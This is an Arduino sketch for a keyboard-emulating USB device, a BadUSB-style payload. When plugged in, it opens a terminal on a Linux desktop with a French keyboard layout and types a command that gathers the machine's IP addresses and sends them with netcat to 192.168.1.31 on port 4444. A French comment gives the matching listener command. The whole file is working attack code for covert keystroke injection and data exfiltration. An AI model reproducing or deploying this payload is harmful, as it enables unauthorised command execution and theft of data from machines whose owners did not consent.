#include <Keyboard.h>

void setup() {
  delay(2000);
  Keyboard.begin(KeyboardLayout_fr_FR);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(1500);

  Keyboard.println("ip a | grep 'inet ' | awk '{print $2}' | nc 192.168.1.31 4444"); // ecoute avec : nc -lvnp 4444
  delay(1000);

  Keyboard.println("exit");
  Keyboard.end();
}

void loop() {}